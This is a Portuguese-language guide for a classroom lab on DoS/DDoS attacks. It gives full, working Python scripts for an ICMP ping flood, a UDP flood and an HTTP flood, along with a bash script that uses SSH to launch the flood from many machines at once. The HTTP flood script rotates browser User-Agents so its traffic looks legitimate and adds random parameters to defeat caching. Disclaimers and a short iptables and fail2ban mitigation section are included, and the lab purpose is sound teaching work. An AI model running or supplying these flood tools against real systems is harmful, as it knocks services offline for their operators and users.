# Guia Prático: Laboratório de Ataques DoS/DDoS em Ambiente Controlado

## Aviso Importante

**Este guia é fornecido EXCLUSIVAMENTE para fins educacionais em ambiente controlado de laboratório.**

- Todos os ataques devem ser realizados APENAS na rede isolada do laboratório
- É ILEGAL realizar estes ataques contra sistemas reais sem autorização expressa
- O objetivo é puramente educacional: compreender como funcionam os ataques para melhor defender-se deles

## Requisitos do Laboratório

- 20 computadores interligados por um switch
- Sistema operacional Linux (Ubuntu/Debian recomendado) em todos os computadores
- Python 3.6+ instalado
- Wireshark ou tcpdump para análise de tráfego
- Permissões de administrador/root
- Rede isolada (sem conexão com internet externa)

## Parte 1: Configuração do Ambiente

### 1.1. Preparação da Rede

1. **Configuração do Switch**:
   - Certifique-se de que o switch está configurado em modo não gerenciado
   - Verifique se todos os computadores estão na mesma sub-rede (ex: 192.168.1.0/24)
   - Desative qualquer proteção contra inundação (flood protection) para fins de demonstração

2. **Configuração dos Computadores**:
   - Designe um computador como "alvo" (vítima)
   - Designe um computador como "monitor" (para análise de tráfego)
   - Os demais computadores serão "atacantes"

3. **Configuração de IPs**:
   ```bash
   # No computador alvo (execute como root/sudo)
   sudo ip addr add 192.168.1.100/24 dev eth0
   
   # Nos computadores atacantes (execute em cada um)
   # Substitua X por um número único para cada máquina (1-19)
   sudo ip addr add 192.168.1.X/24 dev eth0
   
   # No computador monitor
   sudo ip addr add 192.168.1.200/24 dev eth0
   ```

4. **Verificação de Conectividade**:
   ```bash
   # Execute em todos os computadores para verificar conectividade com o alvo
   ping -c 4 192.168.1.100
   ```

### 1.2. Instalação de Ferramentas

Em todos os computadores:

```bash
# Atualize os repositórios
sudo apt update

# Instale as ferramentas necessárias
sudo apt install -y python3 python3-pip tcpdump wireshark tshark iperf3 hping3

# Instale bibliotecas Python necessárias
pip3 install scapy
```

No computador alvo, configure um servidor web simples para testes:

```bash
# Instale o servidor web
sudo apt install -y apache2

# Inicie o serviço
sudo systemctl start apache2

# Verifique o status
sudo systemctl status apache2
```

## Parte 2: Exemplo 1 - Ataque DoS Simples (Ping Flood)

### 2.1. Preparação do Script

Crie o arquivo `ping_flood.py` em um dos computadores atacantes:

```python
#!/usr/bin/env python3

"""
Exemplo educacional de Ping Flood (ICMP Flood) para laboratório
APENAS PARA FINS EDUCACIONAIS EM AMBIENTE CONTROLADO
"""

import socket
import struct
import time
import sys
import random
import os

# Função para calcular o checksum (necessário para cabeçalhos IP e ICMP)
def checksum(msg):
    s = 0
    # Loop de 2 em 2 bytes
    for i in range(0, len(msg), 2):
        if i + 1 < len(msg):
            w = (msg[i] << 8) + msg[i+1]
        else:
            w = msg[i]
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    # Complemento de 1
    s = ~s & 0xffff
    return s

# Função principal
def main(target_ip, duration=30):
    print(f"[*] Iniciando Ping Flood para {target_ip} por {duration} segundos...")
    
    # Verifica permissões de root
    if os.geteuid() != 0:
        print("[!] Erro: Este script precisa ser executado como root para usar sockets raw.")
        sys.exit(1)

    try:
        # Cria um socket raw para ICMP
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as e:
        print(f"[!] Erro ao criar socket: {e}")
        sys.exit(1)

    packet_count = 0
    end_time = time.time() + duration
    
    try:
        while time.time() < end_time:
            # --- Construção do Cabeçalho IP --- (20 bytes)
            ip_ihl = 5          # Internet Header Length (5 words = 20 bytes)
            ip_ver = 4          # Version (IPv4)
            ip_tos = 0          # Type of Service
            ip_tot_len = 0      # Total Length (será calculado depois)
            ip_id = random.randint(10000, 65535) # ID do pacote
            ip_frag_off = 0     # Fragment Offset
            ip_ttl = 255        # Time To Live
            ip_proto = socket.IPPROTO_ICMP # Protocolo (ICMP)
            ip_check = 0        # Checksum (será calculado depois)
            
            # Em ambiente de laboratório, podemos usar o IP real
            source_ip = socket.gethostbyname(socket.gethostname())
            dest_ip = target_ip # IP do alvo

            ip_saddr = socket.inet_aton(source_ip) # Converte IP de origem para binário
            ip_daddr = socket.inet_aton(dest_ip)   # Converte IP de destino para binário

            ip_ihl_ver = (ip_ver << 4) + ip_ihl # Combina versão e IHL

            # Empacota o cabeçalho IP sem o checksum
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

            # --- Construção do Cabeçalho ICMP Echo Request --- (8 bytes + dados)
            icmp_type = 8       # Tipo 8 = Echo Request
            icmp_code = 0       # Código 0 para Echo Request
            icmp_check = 0      # Checksum (será calculado depois)
            icmp_id = random.randint(1, 65535) # ID ICMP
            icmp_seq = packet_count # Número de sequência

            # Dados (payload) - pode ser qualquer coisa
            payload_size = random.randint(32, 1024) # Tamanho aleatório do payload
            icmp_data = bytes(random.getrandbits(8) for _ in range(payload_size))

            # Empacota o cabeçalho ICMP sem o checksum
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)

            # Calcula o checksum ICMP
            temp_icmp_packet = icmp_header + icmp_data
            icmp_check = checksum(temp_icmp_packet)

            # Empacota o cabeçalho ICMP final com o checksum correto
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)

            # --- Montagem do Pacote Completo --- (Cabeçalho IP + Cabeçalho ICMP + Dados)
            packet = ip_header + icmp_header + icmp_data

            # Calcula o comprimento total e o checksum do IP agora que temos o pacote completo
            ip_tot_len = len(packet)
            # Recria o cabeçalho IP com o comprimento correto (checksum ainda 0)
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, socket.htons(0), # Checksum zerado para cálculo
                                ip_saddr, ip_daddr)
            # Calcula o checksum do IP
            ip_check = checksum(ip_header) # Checksum apenas do cabeçalho IP

            # Recria o cabeçalho IP final com o checksum correto
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

            # Monta o pacote final
            packet = ip_header + icmp_header + icmp_data

            # Envia o pacote para o alvo
            try:
                s.sendto(packet, (dest_ip, 0)) # Porta 0 é ignorada para sockets raw IP
                packet_count += 1
                # Imprime status a cada 100 pacotes para não poluir a saída
                if packet_count % 100 == 0:
                    remaining = int(end_time - time.time())
                    print(f"[*] Pacotes enviados: {packet_count} | Tempo restante: {remaining}s", end='\r')
            except socket.error as send_err:
                print(f"\n[!] Erro ao enviar pacote: {send_err}")
                time.sleep(1) # Pausa antes de tentar novamente
            except Exception as general_err:
                print(f"\n[!] Erro inesperado: {general_err}")
                break

    except KeyboardInterrupt:
        print(f"\n[*] Ataque interrompido pelo usuário.")
    finally:
        elapsed_time = min(duration, duration - (end_time - time.time()))
        rate = packet_count / elapsed_time if elapsed_time > 0 else 0
        print(f"\n[*] Ataque concluído. Total de pacotes enviados: {packet_count}")
        print(f"[*] Duração: {elapsed_time:.2f} segundos")
        print(f"[*] Taxa média: {rate:.2f} pacotes/segundo")
        # Fecha o socket ao terminar
        if 's' in locals() and s:
            s.close()
            print("[*] Socket fechado.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 ping_flood.py <ip_alvo> [duração_em_segundos]")
        print("Exemplo: sudo python3 ping_flood.py 192.168.1.100 30")
        sys.exit(1)
    
    target_ip_address = sys.argv[1]
    duration = 30  # Duração padrão: 30 segundos
    
    if len(sys.argv) >= 3:
        try:
            duration = int(sys.argv[2])
            if duration <= 0:
                raise ValueError("A duração deve ser um número positivo")
        except ValueError as e:
            print(f"[!] Erro: {e}")
            sys.exit(1)
    
    main(target_ip_address, duration)
```

### 2.2. Execução do Ataque DoS

1. **No computador monitor**, inicie a captura de pacotes:
   ```bash
   # Capture o tráfego em um arquivo para análise posterior
   sudo tcpdump -i eth0 -w dos_attack.pcap host 192.168.1.100
   
   # Ou use Wireshark com interface gráfica
   sudo wireshark
   ```

2. **No computador alvo**, monitore a carga do sistema:
   ```bash
   # Em um terminal
   watch -n 1 "netstat -an | grep ESTABLISHED | wc -l"
   
   # Em outro terminal
   htop
   ```

3. **Em um computador atacante**, execute o script:
   ```bash
   # Torne o script executável
   chmod +x ping_flood.py
   
   # Execute o ataque por 30 segundos
   sudo python3 ping_flood.py 192.168.1.100 30
   ```

4. **Observe os resultados**:
   - No computador alvo, verifique o aumento de carga na CPU e rede
   - No computador monitor, observe o tráfego ICMP intenso

### 2.3. Análise do Ataque

No computador monitor, analise o tráfego capturado:

```bash
# Análise básica com tcpdump
sudo tcpdump -r dos_attack.pcap -n

# Estatísticas de protocolo
capinfos dos_attack.pcap

# Análise detalhada com tshark
tshark -r dos_attack.pcap -q -z io,stat,1,"COUNT(icmp)icmp"
```

## Parte 3: Exemplo 2 - Ataque DDoS Simulado (UDP Flood Distribuído)

Este exemplo simula um ataque DDoS real, com múltiplos computadores atacando simultaneamente.

### 3.1. Preparação do Script

Crie o arquivo `udp_flood.py` em todos os computadores atacantes:

```python
#!/usr/bin/env python3

"""
Exemplo educacional de UDP Flood para laboratório DDoS
APENAS PARA FINS EDUCACIONAIS EM AMBIENTE CONTROLADO
"""

import socket
import random
import sys
import time
import os
import argparse

def main(target_ip, target_port, packet_size=1024, duration=30, attack_id=0):
    """
    Executa um ataque UDP Flood
    
    Parâmetros:
        target_ip: IP do alvo
        target_port: Porta do alvo
        packet_size: Tamanho do pacote em bytes
        duration: Duração do ataque em segundos
        attack_id: ID do atacante (para identificação em análise)
    """
    print(f"[*] Atacante #{attack_id} - Iniciando UDP Flood para {target_ip}:{target_port}")
    print(f"[*] Tamanho do pacote: {packet_size} bytes | Duração: {duration} segundos")
    
    try:
        # Cria um socket UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as e:
        print(f"[!] Erro ao criar socket: {e}")
        sys.exit(1)

    # Gera dados para o payload com identificador do atacante
    attack_id_bytes = str(attack_id).encode()
    random_data = os.urandom(packet_size - len(attack_id_bytes))
    payload = attack_id_bytes + random_data

    packet_count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            try:
                # Envia o pacote UDP para o alvo
                s.sendto(payload, (target_ip, target_port))
                packet_count += 1

                # Imprime status periodicamente
                if packet_count % 1000 == 0:
                    remaining = int(end_time - time.time())
                    print(f"[*] Atacante #{attack_id} - Pacotes: {packet_count} | Restante: {remaining}s", end='\r')

            except socket.error as send_err:
                print(f"\n[!] Erro ao enviar pacote: {send_err}")
                time.sleep(0.5)
            except Exception as general_err:
                print(f"\n[!] Erro inesperado: {general_err}")
                break

    except KeyboardInterrupt:
        print(f"\n[*] Ataque interrompido pelo usuário.")
    finally:
        elapsed_time = min(duration, duration - (end_time - time.time()))
        rate = packet_count / elapsed_time if elapsed_time > 0 else 0
        print(f"\n[*] Atacante #{attack_id} - Ataque concluído")
        print(f"[*] Total de pacotes enviados: {packet_count}")
        print(f"[*] Duração: {elapsed_time:.2f} segundos")
        print(f"[*] Taxa média: {rate:.2f} pacotes/segundo")
        
        if 's' in locals() and s:
            s.close()
            print("[*] Socket fechado.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exemplo educacional de UDP Flood para laboratório DDoS')
    parser.add_argument('target_ip', help='Endereço IP do alvo')
    parser.add_argument('target_port', type=int, help='Porta UDP do alvo')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Tamanho do pacote em bytes (padrão: 1024)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Duração do ataque em segundos (padrão: 30)')
    parser.add_argument('-i', '--id', type=int, default=0, help='ID do atacante (padrão: 0)')
    
    args = parser.parse_args()
    
    if args.size <= 0 or args.size > 65507:  # Limite prático UDP IPv4
        print("[!] Erro: Tamanho do pacote deve estar entre 1 e 65507 bytes")
        sys.exit(1)
        
    if args.duration <= 0:
        print("[!] Erro: Duração deve ser um número positivo")
        sys.exit(1)
    
    main(args.target_ip, args.target_port, args.size, args.duration, args.id)
```

### 3.2. Preparação do Servidor Alvo

No computador alvo, crie um servidor UDP simples para demonstração:

```python
#!/usr/bin/env python3

"""
Servidor UDP simples para demonstração de ataque DDoS
"""

import socket
import time
import signal
import sys

def signal_handler(sig, frame):
    print("\n[*] Servidor encerrado pelo usuário")
    sys.exit(0)

def main(host='0.0.0.0', port=9999):
    # Registra o handler para Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cria o socket UDP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((host, port))
    
    print(f"[*] Servidor UDP iniciado em {host}:{port}")
    print("[*] Pressione Ctrl+C para encerrar")
    
    packet_count = 0
    start_time = time.time()
    last_report = start_time
    
    try:
        while True:
            # Recebe dados (buffer de 65535 bytes)
            data, addr = server_socket.recvfrom(65535)
            packet_count += 1
            
            # Imprime estatísticas a cada segundo
            current_time = time.time()
            if current_time - last_report >= 1.0:
                elapsed = current_time - start_time
                rate = packet_count / elapsed if elapsed > 0 else 0
                print(f"[*] Pacotes recebidos: {packet_count} | Taxa: {rate:.2f} pps", end='\r')
                last_report = current_time
                
    except Exception as e:
        print(f"\n[!] Erro: {e}")
    finally:
        if 'server_socket' in locals():
            server_socket.close()
            print("\n[*] Socket do servidor fechado")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Servidor UDP simples para demonstração')
    parser.add_argument('-p', '--port', type=int, default=9999, help='Porta UDP (padrão: 9999)')
    
    args = parser.parse_args()
    main(port=args.port)
```

Salve como `udp_server.py` e execute:

```bash
chmod +x udp_server.py
python3 udp_server.py
```

### 3.3. Execução do Ataque DDoS Coordenado

1. **No computador monitor**, inicie a captura:
   ```bash
   sudo tcpdump -i eth0 -w ddos_attack.pcap host 192.168.1.100 and udp port 9999
   ```

2. **No computador alvo**, execute o servidor UDP:
   ```bash
   python3 udp_server.py
   ```

3. **Coordenação do ataque**:
   - Distribua o script `udp_flood.py` para todos os computadores atacantes
   - Atribua um ID único para cada atacante (1-19)
   - Prepare um script de coordenação para iniciar o ataque simultaneamente

4. **Em cada computador atacante**, execute (com seu ID único):
   ```bash
   # Torne o script executável
   chmod +x udp_flood.py
   
   # Execute o ataque (substitua X pelo ID do atacante)
   python3 udp_flood.py 192.168.1.100 9999 -s 1024 -d 60 -i X
   ```

5. **Opcionalmente**, use um script de coordenação SSH para iniciar todos os ataques simultaneamente:

```bash
#!/bin/bash
# Salve como coordinator.sh

# Lista de IPs dos atacantes
ATTACKERS=(
  "192.168.1.1"
  "192.168.1.2"
  # ... adicione todos os IPs ...
  "192.168.1.19"
)

TARGET="192.168.1.100"
PORT=9999
DURATION=60

echo "[*] Iniciando ataque DDoS coordenado contra $TARGET:$PORT"
echo "[*] Duração: $DURATION segundos"
echo "[*] Número de atacantes: ${#ATTACKERS[@]}"

# Inicia o ataque em cada máquina
for i in "${!ATTACKERS[@]}"; do
  ATTACKER_IP="${ATTACKERS[$i]}"
  ATTACKER_ID=$((i+1))
  
  echo "[*] Iniciando atacante #$ATTACKER_ID ($ATTACKER_IP)..."
  ssh usuario@$ATTACKER_IP "cd /tmp && python3 udp_flood.py $TARGET $PORT -s 1024 -d $DURATION -i $ATTACKER_ID" &
done

echo "[*] Todos os atacantes foram iniciados!"
echo "[*] O ataque terminará em aproximadamente $DURATION segundos"

# Aguarda a conclusão
wait
echo "[*] Ataque DDoS coordenado concluído"
```

### 3.4. Análise do Ataque DDoS

No computador monitor, analise o tráfego capturado:

```bash
# Análise básica
sudo tcpdump -r ddos_attack.pcap -n

# Estatísticas por IP de origem (identificar todos os atacantes)
tshark -r ddos_attack.pcap -q -z ip,srt,1

# Estatísticas de taxa de pacotes por segundo
tshark -r ddos_attack.pcap -q -z io,stat,1,"COUNT(udp)udp"

# Análise de distribuição de tamanho de pacotes
tshark -r ddos_attack.pcap -q -z plen,tree

# Identificação dos atacantes pelo ID no payload
tshark -r ddos_attack.pcap -Y "udp" -T fields -e ip.src -e data | head -20
```

## Parte 4: Mitigação Básica

Para demonstrar técnicas simples de mitigação, você pode implementar:

### 4.1. Filtragem com iptables

No computador alvo:

```bash
# Limitar taxa de pacotes ICMP (para o Ping Flood)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Limitar conexões UDP para a porta do servidor
sudo iptables -A INPUT -p udp --dport 9999 -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 9999 -j DROP

# Verificar regras
sudo iptables -L -v -n
```

### 4.2. Configuração de Fail2ban

Instale e configure o Fail2ban para bloquear IPs que excedam limites:

```bash
sudo apt install -y fail2ban

# Crie uma configuração personalizada
sudo nano /etc/fail2ban/jail.local
```

Adicione:

```
[udp-flood]
enabled = true
filter = udp-flood
action = iptables-allports
logpath = /var/log/syslog
maxretry = 5
findtime = 60
bantime = 3600
```

Crie o filtro:

```bash
sudo nano /etc/fail2ban/filter.d/udp-flood.conf
```

Adicione:

```
[Definition]
failregex = kernel: \[UFW BLOCK\] IN=.* SRC=<HOST> .* PROTO=UDP .*
ignoreregex =
```

Reinicie o serviço:

```bash
sudo systemctl restart fail2ban
```

## Parte 5: Limpeza do Laboratório

Após a conclusão dos experimentos:

```bash
# Remova as regras de iptables
sudo iptables -F

# Pare os serviços
sudo systemctl stop apache2
sudo systemctl stop fail2ban

# Remova arquivos temporários
rm -f *.py *.pcap
```

## Conclusão

Este laboratório demonstra:

1. Como ataques DoS simples funcionam (Ping Flood)
2. Como ataques DDoS coordenados amplificam o impacto (UDP Flood Distribuído)
3. Técnicas básicas de análise de tráfego para identificar ataques
4. Métodos simples de mitigação

Lembre-se que em ambientes reais, a mitigação de ataques DDoS geralmente requer soluções mais robustas, como:

- Serviços de mitigação baseados em nuvem (ex: Cloudflare, AWS Shield)
- Appliances dedicados de proteção DDoS
- Redes Anycast para distribuir o impacto
- Análise comportamental avançada

O conhecimento adquirido neste laboratório ajuda a compreender melhor as ameaças e a desenvolver estratégias de defesa mais eficazes.

---

## Apêndice: Exemplo Adicional - Ataque HTTP Flood (Camada 7)

Para demonstrar um ataque na camada de aplicação, você pode usar este script:

```python
#!/usr/bin/env python3

"""
Exemplo educacional de HTTP Flood para laboratório
APENAS PARA FINS EDUCACIONAIS EM AMBIENTE CONTROLADO
"""

import requests
import threading
import time
import random
import argparse
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suprimir avisos de SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Lista de User-Agents para parecer tráfego legítimo
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
]

# Contador global de requisições
request_count = 0
request_lock = threading.Lock()

def worker(url, attack_id, method="GET", duration=30):
    """Função de trabalho para cada thread"""
    global request_count
    
    end_time = time.time() + duration
    session = requests.Session()
    
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "X-Attack-ID": str(attack_id)  # Para identificação em logs
            }
            
            # Adiciona parâmetros aleatórios para evitar cache
            params = {
                "id": random.randint(1, 1000),
                "t": int(time.time() * 1000),
                "r": random.random()
            }
            
            if method == "GET":
                response = session.get(
                    url, 
                    params=params,
                    headers=headers, 
                    timeout=1,
                    verify=False
                )
            else:  # POST
                # Dados de formulário aleatórios
                data = {
                    "username": f"user_{random.randint(1, 10000)}",
                    "password": f"pass_{random.randint(1, 10000)}",
                    "submit": "Login"
                }
                response = session.post(
                    url, 
                    data=data,
                    headers=headers, 
                    timeout=1,
                    verify=False
                )
            
            # Incrementa o contador global de forma thread-safe
            with request_lock:
                request_count += 1
                
        except requests.exceptions.RequestException:
            # Ignora erros de conexão e continua
            pass
        except Exception as e:
            print(f"Erro: {e}")
            
        # Pequena pausa para não sobrecarregar a CPU local
        time.sleep(0.01)

def main(url, num_threads=10, method="GET", duration=30, attack_id=0):
    """Função principal para coordenar o ataque HTTP Flood"""
    global request_count
    
    print(f"[*] Atacante #{attack_id} - Iniciando HTTP Flood para {url}")
    print(f"[*] Método: {method} | Threads: {num_threads} | Duração: {duration} segundos")
    
    # Inicializa as threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(
            target=worker,
            args=(url, attack_id, method, duration)
        )
        threads.append(t)
        t.daemon = True
        t.start()
    
    # Monitoramento em tempo real
    start_time = time.time()
    last_count = 0
    
    try:
        while time.time() < start_time + duration:
            time.sleep(1)
            current_time = time.time() - start_time
            current_count = request_count
            rate = current_count - last_count
            
            print(f"[*] Atacante #{attack_id} - Tempo: {int(current_time)}s | Requisições: {current_count} | Taxa: {rate} req/s", end='\r')
            
            last_count = current_count
    
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário")
    
    # Aguarda todas as threads terminarem
    for t in threads:
        t.join(0.1)
    
    # Estatísticas finais
    elapsed_time = time.time() - start_time
    rate = request_count / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n[*] Atacante #{attack_id} - Ataque concluído")
    print(f"[*] Total de requisições: {request_count}")
    print(f"[*] Duração: {elapsed_time:.2f} segundos")
    print(f"[*] Taxa média: {rate:.2f} requisições/segundo")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exemplo educacional de HTTP Flood para laboratório')
    parser.add_argument('url', help='URL alvo (ex: http://192.168.1.100/)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Número de threads (padrão: 10)')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help='Método HTTP (padrão: GET)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Duração do ataque em segundos (padrão: 30)')
    parser.add_argument('-i', '--id', type=int, default=0, help='ID do atacante (padrão: 0)')
    
    args = parser.parse_args()
    
    if args.threads <= 0:
        print("[!] Erro: O número de threads deve ser positivo")
        sys.exit(1)
        
    if args.duration <= 0:
        print("[!] Erro: A duração deve ser um número positivo")
        sys.exit(1)
    
    main(args.url, args.threads, args.method, args.duration, args.id)
```

Para usar este exemplo, siga estas etapas:

1. Certifique-se de que o servidor Apache está rodando no alvo
2. Instale as dependências: `pip3 install requests`
3. Execute o ataque em cada máquina atacante:
   ```bash
   python3 http_flood.py http://192.168.1.100/ -t 20 -d 60 -i X
   ```

Este ataque é particularmente eficaz contra servidores web, pois consome recursos de CPU, memória e conexões simultâneas.
